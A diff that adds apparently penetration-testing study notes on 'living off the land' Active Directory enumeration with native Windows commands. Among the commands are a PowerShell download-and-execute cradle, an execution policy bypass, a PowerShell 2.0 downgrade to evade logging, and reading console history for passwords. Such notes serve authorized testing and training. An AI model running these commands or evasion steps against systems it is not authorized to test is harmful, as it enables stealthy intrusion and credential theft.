@@ -1117,3 +1117,202 @@ ls
 - **Database Info Tab**: View detailed information about the database.
 - **Node Info Tab**: Search for specific nodes like Domain Users.
 - **Settings Menu**: Adjust how nodes and edges are displayed, enable query debug mode, and enable dark mode.
+
+# Living OFF the Land
+
+When traditional methods fail, "living off the land" utilizes native Windows tools and commands for stealthier enumeration. This approach minimizes log entries, reduces the chance of detection by monitoring tools, and aligns with scenarios where uploading external tools isn't feasible.
+
+---
+
+### **Scenario**
+- Client request: Test AD environment from a managed host with no internet and no external tool uploads.
+- Goal: Identify possible enumeration activities using only built-in tools, avoiding alerts from monitoring systems such as IDS/IPS or enterprise EDR.
+- Strategy: Use native Windows utilities to explore the host and network configurations, maintain stealth, and minimize defender-triggered responses.
+
+---
+
+### **Host and Network Recon: Key Commands**
+
+#### **Basic Enumeration Commands**
+| Command                                   | Description                                                                                   |
+|-------------------------------------------|-----------------------------------------------------------------------------------------------|
+| `hostname`                                | Displays the PC's name.                                                                       |
+| `[System.Environment]::OSVersion.Version` | Prints the OS version and revision level.                                                    |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lists applied patches and hotfixes.                                                           |
+| `ipconfig /all`                           | Outputs network adapter configurations.                                                      |
+| `set`                                     | Displays environment variables for the current session.                                       |
+| `echo %USERDOMAIN%`                       | Prints the domain name of the host.                                                          |
+| `echo %logonserver%`                      | Shows the name of the domain controller the host checks in with.                             |
+| `systeminfo`                              | Provides a summary of host information in one tidy output (e.g., OS, domain, network details).|
+
+---
+
+### **Harnessing PowerShell for Advanced Recon**
+PowerShell offers extensive capabilities for system and network reconnaissance.
+
+#### **Essential PowerShell Cmdlets**
+| Cmdlet                                             | Description                                                                                     |
+|----------------------------------------------------|-------------------------------------------------------------------------------------------------|
+| `Get-Module`                                       | Lists available modules.                                                                        |
+| `Get-ExecutionPolicy -List`                        | Displays execution policies by scope.                                                          |
+| `Set-ExecutionPolicy Bypass -Scope Process`        | Temporarily bypasses execution policy for the current session.                                  |
+| `Get-ChildItem Env: | ft Key,Value`                | Lists environment variables with keys and values.                                               |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Retrieves PowerShell history for potential insights (e.g., scripts or passwords).               |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"` | Downloads and executes content directly in memory (if internet access is available).            |
+
+---
+
+### **Downgrading PowerShell for Stealth**
+- **Rationale**: Versions prior to PowerShell 3.0 lack advanced logging features, such as Script Block Logging.
+- **Steps**:
+  1. Verify current version with `Get-Host`.
+  2. Downgrade: `powershell.exe -version 2`.
+  3. Confirm with `Get-Host` (Version should display `2.0`).
+
+#### **Caveat**:
+- Actions to downgrade (e.g., `powershell.exe -version 2`) are logged, but subsequent activity in version 2.0 is not.
+
+---
+
+### **Checking Host Defenses**
+#### **Firewall Configuration**
+- **Command**: `netsh advfirewall show allprofiles`
+- **Key Insights**:
+  - State: ON/OFF for domain, private, and public profiles.
+  - Policies: Inbound/Outbound traffic rules.
+  - Logging: Status of allowed/dropped connections.
+
+#### **Windows Defender Status**
+1. **Service Check** (CMD):
+   - `sc query windefend`  
+   - Checks if the Windows Defender service is running.
+2. **Configuration Details** (PowerShell):
+   - `Get-MpComputerStatus`  
+   - Displays detailed Defender settings (e.g., real-time protection, signature versions, scanning schedules).
+
+---
+
+### **Am I Alone?**
+- **Command**: `qwinsta`
+- **Purpose**: Lists active user sessions to ensure actions won’t alert a logged-in user.
+- **Output Example**:
+  - `SESSIONNAME`: Console or remote session type.
+  - `USERNAME`: Active user(s).
+
+---
+
+### **Network Enumeration**
+#### **Key Networking Commands**
+| Command               | Description                                                                                     |
+|-----------------------|-------------------------------------------------------------------------------------------------|
+| `arp -a`              | Lists ARP table entries (known hosts).                                                         |
+| `ipconfig /all`       | Details network adapter configurations (e.g., IP, DNS, gateway).                               |
+| `route print`         | Displays IPv4/IPv6 routing table (known routes to networks).                                   |
+| `netsh advfirewall show allprofiles` | Displays firewall configuration settings.                                                |
+
+#### **Analyzing ARP and Routing**
+- **ARP Table (`arp -a`)**:
+  - Identifies IP and MAC addresses of connected hosts.
+  - Helps locate potential target devices.
+- **Routing Table (`route print`)**:
+  - Reveals known networks and possible lateral movement paths.
+  - Persistent routes can indicate administratively-set paths or frequent access points.
+
+---
+
+### **Windows Management Instrumentation (WMI) and Domain Enumeration Techniques**
+
+#### **WMI Overview**
+WMI is a powerful scripting engine used in Windows environments for administrative tasks and information retrieval. It enables local and remote queries about users, groups, processes, and system configurations, making it invaluable for enumeration tasks.
+
+---
+
+### **WMI Commands**
+| **Command** | **Description** |
+|-------------|------------------|
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lists applied patches and hotfixes. |
+| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic system details. |
+| `wmic process list /format:list` | Lists all running processes. |
+| `wmic ntdomain list /format:list` | Provides details about the domain and domain controllers. |
+| `wmic useraccount list /format:list` | Outputs all local and logged-in domain accounts. |
+| `wmic group list /format:list` | Lists local groups. |
+| `wmic sysaccount list /format:list` | Dumps service account information. |
+
+---
+
+### **Net Commands**
+Net commands provide information about users, groups, and domain settings. They are versatile but may trigger alerts in monitored environments.
+
+| **Command** | **Description** |
+|-------------|------------------|
+| `net accounts` | Displays local password policy. |
+| `net accounts /domain` | Shows domain password and lockout policy. |
+| `net group /domain` | Lists domain groups. |
+| `net group "Domain Admins" /domain` | Lists users in the "Domain Admins" group. |
+| `net user <ACCOUNT_NAME> /domain` | Retrieves details about a specific domain user. |
+| `net user /domain` | Lists all domain users. |
+| `net localgroup administrators /domain` | Displays members of the "Administrators" group. |
+| `net view /domain` | Lists PCs in the domain. |
+| `net view \computer /ALL` | Shows all shares on a specific computer. |
+
+#### **Key Notes**:
+- Use `net1` as a stealthy alternative to `net` commands in monitored environments.
+
+---
+
+### **Dsquery Commands**
+`dsquery` enables Active Directory (AD) object searches. It's available on hosts with the AD Domain Services role and uses built-in DLLs.
+
+| **Command** | **Description** |
+|-------------|------------------|
+| `dsquery user` | Lists all users in AD. |
+| `dsquery computer` | Outputs all computers in AD. |
+| `dsquery * "CN=Users,DC=DOMAIN,DC=LOCAL"` | Searches a specific OU for all objects. |
+| `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl` | Finds users with the `PASSWD_NOTREQD` flag set. |
+| `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName` | Lists five domain controllers in the current domain. |
+
+#### **Search Customization**:
+- Use LDAP filters (`objectClass=user`, etc.) with logical operators:
+  - **&**: AND (`(&(criteria1)(criteria2))`).
+  - **|**: OR (`(|(criteria1)(criteria2))`).
+  - **!**: NOT (`(!criteria)`).
+
+#### **Common LDAP Matching Rules**:
+1. **`1.2.840.113556.1.4.803`**: Matches specific bit values exactly.
+2. **`1.2.840.113556.1.4.804`**: Matches any bit in a chain.
+3. **`1.2.840.113556.1.4.1941`**: Matches Distinguished Names across ownership/membership.
+
+#### **Example Filters**:
+- Search for users with **Password Can't Change**:  
+  `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`
+- Exclude users with **Password Can't Change**:  
+  `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`
+
+---
+### **UserAccountControl (UAC) Values and Their Corresponding Attributes**
+
+The **UserAccountControl (UAC)** attribute in Active Directory defines specific properties of user accounts. These properties are stored as a bitmask, and each value corresponds to a particular attribute. The values can combine to represent multiple attributes simultaneously.
+
+| **Value** | **Attribute**                                         | **Description**                                                                                   |
+|-----------|-------------------------------------------------------|---------------------------------------------------------------------------------------------------|
+| `2`       | **ACCOUNTDISABLE**                                    | The account is disabled.                                                                          |
+| `8`       | **HOMEDIR_REQUIRED**                                  | A home directory is required.                                                                    |
+| `16`      | **LOCKOUT**                                           | The account is locked out.                                                                       |
+| `32`      | **PASSWD_NOTREQD**                                    | The account does not require a password.                                                         |
+| `64`      | **PASSWD_CANT_CHANGE**                                | The user cannot change the password.                                                             |
+| `128`     | **ENCRYPTED_TEXT_PWD_ALLOWED**                        | The account allows the storage of a reversible encrypted password.                               |
+| `512`     | **NORMAL_ACCOUNT**                                    | A typical user account.                                                                          |
+| `2048`    | **INTERDOMAIN_TRUST_ACCOUNT**                         | A domain trust account.                                                                          |
+| `4096`    | **WORKSTATION_TRUST_ACCOUNT**                         | A computer account for a workstation or server.                                                  |
+| `8192`    | **SERVER_TRUST_ACCOUNT**                              | A domain controller account.                                                                     |
+| `65536`   | **DONT_EXPIRE_PASSWORD**                              | The password is set not to expire.                                                               |
+| `131072`  | **SMARTCARD_REQUIRED**                                | The account requires a smart card for login.                                                     |
+| `262144`  | **TRUSTED_FOR_DELEGATION**                            | The account is trusted for delegation.                                                           |
+| `524288`  | **NOT_DELEGATED**                                     | The account cannot be delegated.                                                                 |
+| `1048576` | **USE_DES_KEY_ONLY**                                  | The account is restricted to use only DES encryption types for keys.                             |
+
+---
+
+### **Combining UAC Values**
+- UAC values can combine to represent multiple properties. For example:
+  - A disabled account (`2`) that does not require a password (`32`) would have a UAC value of `34` (`2 + 32`).
